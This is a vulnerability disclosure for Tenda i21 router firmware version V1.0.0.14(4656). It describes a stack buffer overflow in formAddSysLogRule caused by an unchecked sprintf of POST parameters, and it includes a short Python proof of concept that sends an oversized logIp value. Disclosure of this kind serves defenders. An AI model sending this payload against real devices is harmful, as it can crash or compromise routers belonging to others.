## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formAddSysLogRule` function. The `logIp, logPort, en` variable receives the `logIp, logPort, sysRuleEn` parameter from a POST request. However, since the user can control the input of `logIp, logPort, sysRuleEn`, the statement `sprintf(mib_value, "%s;%s;%s", logip, logport, en);` can cause a buffer overflow. The user-provided  `logip, logport, sysRuleEn` can exceed the capacity of the `mib_value` array, triggering this security vulnerability.

![image-20240419203138230](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419203138230.png)

## POC

```python
payload = b"a"*2000

data = {"op": "add", "logIp": payload}
response = requests.post(url, data=data)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
